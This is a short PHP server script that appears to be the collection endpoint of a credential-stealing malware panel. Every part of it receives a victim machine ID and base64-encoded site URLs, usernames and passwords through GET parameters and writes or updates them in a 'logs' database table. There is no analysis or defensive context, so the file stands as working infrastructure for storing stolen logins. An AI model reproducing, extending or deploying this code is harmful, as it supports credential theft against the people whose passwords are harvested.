<?php
include '../inc/config.php';
include '../inc/functions.php';

if(isset($_GET['hwid'])){
    $url = str_replace(array("\n", "\r"), '', base64_decode($_GET['url']));
    $user = str_replace(array("\n", "\r"), '', base64_decode($_GET['username']));
    $pass = str_replace(array("\n", "\r"), '', base64_decode($_GET['password']));
    $check = $con->prepare("SELECT COUNT(*) FROM logs WHERE url=?");
    $check->execute(array($url));
    if($check->fetch()[0] < 1)
        $con->prepare("INSERT INTO logs(hwid,url,username,password,time) VALUES(:hwid,:url,:user,:pass,:time)")->execute(array(
            ':hwid' => $_GET['hwid'],
            ':url' => $url,
            ':user' => $user,
            ':pass' => $pass,
            ':time' => time()
        ));
    else
        $con->prepare("UPDATE logs SET username=:user, password=:pass, time=:time WHERE url=:url AND hwid=:hwid")->execute(array(
            ':hwid' => $_GET['hwid'],
            ':url' => $url,
            ':user' => $user,
            ':pass' => $pass,
            ':time' => time()
        ));
}